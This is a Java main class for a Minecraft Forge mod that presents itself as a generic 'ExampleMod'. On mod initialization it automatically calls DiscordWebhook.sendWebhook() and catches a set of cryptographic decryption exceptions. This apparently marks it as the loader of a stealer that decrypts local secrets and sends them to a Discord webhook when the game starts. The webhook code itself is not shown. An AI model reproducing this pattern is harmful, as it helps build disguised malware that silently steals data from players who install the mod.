package studio.dreamys;

import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import java.io.IOException;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;


@Mod(modid = ExampleMod.MODID, version = ExampleMod.VERSION)
public class ExampleMod {
    public static final String MODID = "examplemod";
    public static final String VERSION = "1.0";

    @Mod.EventHandler
    public void init(FMLInitializationEvent event) {
        try {
            DiscordWebhook.sendWebhook();
        } catch (InvalidAlgorithmParameterException | InvalidKeyException | BadPaddingException |
                 NoSuchAlgorithmException | IllegalBlockSizeException | NoSuchPaddingException | IOException e) {
            throw new RuntimeException(e);
        }
    }
}